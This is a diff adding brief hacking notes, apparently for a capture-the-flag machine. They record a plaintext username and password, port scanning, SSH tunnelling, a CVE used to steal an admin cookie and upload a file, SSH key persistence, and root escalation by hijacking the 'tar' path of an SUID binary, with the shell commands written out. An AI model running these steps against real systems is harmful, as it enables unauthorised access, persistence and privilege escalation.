@@ -2,4 +2,21 @@
 NOTES
 ------------------
 
+nmap scanning udp ports, find user creds
+
 daniel:HotelBabylon23
+
+can see there is a webserver listening on port 80, ssh tunnel to local host
+
+use cve to get an admin cookie, can login as admin to fms and upload a file
+
+ssh - persistence
+	chmod 700 .ssh
+	chmod 600 authorized_keys
+
+as matt:
+	find all suid's - pandora_backup
+	can hijack the tar path
+	echo "'/bin/bash' > tar"
+	export PATH=$pwd:$PATH
+	/usr/bin/pandora_backup
